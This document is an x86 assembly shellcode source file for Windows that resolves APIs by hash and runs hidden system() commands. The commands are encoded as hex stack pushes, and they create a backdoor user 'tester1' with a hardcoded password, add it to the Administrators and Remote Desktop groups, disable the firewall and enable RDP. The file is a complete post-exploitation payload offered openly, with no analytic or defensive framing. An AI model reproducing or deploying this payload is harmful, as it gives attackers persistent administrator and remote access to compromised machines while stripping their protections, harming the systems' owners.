; Purpose: Use Win32 API to 
;  - create a new user and add to local administrators group and 'Remote Desktop' group
;  - Disable Firewall
;  - Enable RDP
;  - Exit  
;
; Uses Stephen Fewer's Block API hashing 
;  https://raw.githubusercontent.com/rapid7/metasploit-framework/master/external/source/shellcode/windows/x86/src/block/block_api.asm

[BITS 32]

  cld
  call start

; Input: The hash of the API to call and all its parameters must be pushed onto stack.
; Output: The return value from the API call will be in EAX.
; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
; Note: This function is unable to call forwarded exports.

api_call:
  pushad                     ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp               ; Create a new stack frame
  xor edx, edx               ; Zero EDX
  mov edx, [fs:edx+0x30]     ; Get a pointer to the PEB
  mov edx, [edx+0xc]         ; Get PEB->Ldr
  mov edx, [edx+0x14]        ; Get the first module from the InMemoryOrder module list

next_mod:                    ;
  mov esi, [edx+0x28]        ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+0x26] ; Set ECX to the length we want to check
  xor edi, edi               ; Clear EDI which will store the hash of the module name

loop_modname:                ;
  xor eax, eax               ; Clear EAX
  lodsb                      ; Read in the next byte of the name
  cmp al, 'a'                ; Some versions of Windows use lower case module names
  jl not_lowercase           ;
  sub al, 0x20               ; If so normalise to uppercase

not_lowercase:               ;
  ror edi, 0xd               ; Rotate right our hash value
  add edi, eax               ; Add the next byte of the name
  dec ecx
  jnz loop_modname           ; Loop until we have read enough
  ; We now have the module hash computed
  push edx                   ; Save the current position in the module list for later
  push edi                   ; Save the current module hash for later
  ; Proceed to iterate the export address table,
  mov edx, [edx+0x10]        ; Get this modules base address
  mov eax, [edx+0x3c]        ; Get PE header
  add eax, edx               ; Add the modules base address
  mov eax, [eax+0x78]        ; Get export tables RVA
  test eax, eax              ; Test if no export address table is present
  jz get_next_mod1           ; If no EAT present, process the next module
  add eax, edx               ; Add the modules base address
  push eax                   ; Save the current modules EAT
  mov ecx, [eax+0x18]        ; Get the number of function names
  mov ebx, [eax+0x20]        ; Get the rva of the function names
  add ebx, edx               ; Add the modules base address

; Computing the module hash + function hash
get_next_func:               ;
  test ecx, ecx              ; Changed from jecxz to accomodate the larger offset produced by random jmps below
  jz get_next_mod            ; When we reach the start of the EAT (we search backwards), process the next module
  dec ecx                    ; Decrement the function name counter
  mov esi, [ebx+ecx*4]       ; Get rva of next module name
  add esi, edx               ; Add the modules base address
  xor edi, edi               ; Clear EDI which will store the hash of the function name

; And compare it to the one we want
loop_funcname:               ;
  xor eax, eax               ; Clear EAX
  lodsb                      ; Read in the next byte of the ASCII function name
  ror edi, 0xd               ; Rotate right our hash value
  add edi, eax               ; Add the next byte of the name
  cmp al, ah                 ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname          ; If we have not reached the null terminator, continue
  add edi, [ebp-8]           ; Add the current module hash to the function hash
  cmp edi, [ebp+0x24]        ; Compare the hash to the one we are searchnig for
  jnz get_next_func          ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                    ; Restore the current modules EAT
  mov ebx, [eax+0x24]        ; Get the ordinal table rva
  add ebx, edx               ; Add the modules base address
  mov cx, [ebx+2*ecx]        ; Get the desired functions ordinal
  mov ebx, [eax+0x1c]        ; Get the function addresses table rva
  add ebx, edx               ; Add the modules base address
  mov eax, [ebx+4*ecx]       ; Get the desired functions RVA
  add eax, edx               ; Add the modules base address to get the functions actual VA

; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+0x24], eax        ; Overwrite the old EAX value with the desired api address for the upcoming popad
  pop ebx                    ; Clear off the current modules hash
  pop ebx                    ; Clear off the current position in the module list
  popad                      ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
  pop ecx                    ; Pop off the origional return address our caller will have pushed
  pop edx                    ; Pop off the hash value our caller will have pushed
  push ecx                   ; Push back the correct return value
  jmp eax                    ; Jump into the required function

; We now automagically return to the correct caller...
get_next_mod:                ;
  pop eax                    ; Pop off the current (now the previous) modules EAT

get_next_mod1:               ;
  pop edi                    ; Pop off the current (now the previous) modules hash
  pop edx                    ; Restore our position in the module list
  mov edx, [edx]             ; Get the next module
  jmp next_mod               ; Process this module


; Begin Add User Code
start:
  pop ebp		     ; pop off the address of 'api_call' for calling later

  ; LoadLibrary(msvcrt)
  push 0x00007472               ; msvcrt in reverse
  push 0x6376736d               ; ....
  push esp                      ; push pointer to msvcrt
  push 0x0726774C               ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp                      ; LoadLibraryA( "msvcrt" )

  ; 'net user tester1 P@ssword123 /add & net localgroup administrators tester1 /add & net localgroup "Remote desktop users" tester1 /add '
  push 0x00646461
  push 0x2f203172
  push 0x65747365
  push 0x74202273
  push 0x72657375
  push 0x20706f74
  push 0x6b736564
  push 0x2065746f
  push 0x6d655222
  push 0x2070756f
  push 0x72676c61
  push 0x636f6c20
  push 0x74656e20
  push 0x26206464
  push 0x612f2031
  push 0x72657473
  push 0x65742073
  push 0x726f7461
  push 0x72747369
  push 0x6e696d64
  push 0x61207075
  push 0x6f72676c
  push 0x61636f6c
  push 0x2074656e
  push 0x20262064
  push 0x64612f20
  push 0x33323164
  push 0x726f7773
  push 0x73405020
  push 0x31726574
  push 0x73657420
  push 0x72657375
  push 0x2074656e
  push esp			; pointer to net user command  
  push 0x8F0BEADC		; hash of msvcrt.dll!system'
  call ebp  			

  ; 'netsh firewall set opmode disable   '
  push 0x00000065
  push 0x6c626173
  push 0x69642065
  push 0x646f6d70
  push 0x6f207465
  push 0x73206c6c
  push 0x61776572
  push 0x69662068
  push 0x7374656e
  push esp                      ; pointer to net user command
  push 0x8F0BEADC               ; hash of msvcrt.dll!system'
  call ebp 

  ; 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
  push 0x00000000
  push 0x662f2030
  push 0x20642f20
  push 0x44524f57
  push 0x445f4745
  push 0x5220742f
  push 0x20736e6f
  push 0x69746365
  push 0x6e6e6f43
  push 0x5354796e
  push 0x65446620
  push 0x762f2022
  push 0x72657672
  push 0x6553206c
  push 0x616e696d
  push 0x7265545c
  push 0x6c6f7274
  push 0x6e6f435c
  push 0x7465536c
  push 0x6f72746e
  push 0x6f43746e
  push 0x65727275
  push 0x435c4d45
  push 0x54535953
  push 0x5c454e49
  push 0x4843414d
  push 0x5f4c4143
  push 0x4f4c5f59
  push 0x454b4822
  push 0x20646461
  push 0x20676572
  push esp                      ; pointer to net user command
  push 0x8F0BEADC               ; hash of msvcrt.dll!system'
  call ebp

  ; Exit Process
  xor eax, eax
  push eax
  push 0x56A2B5F0      ; hash("kernel32.dll", "ExitProcess") 
  call ebp
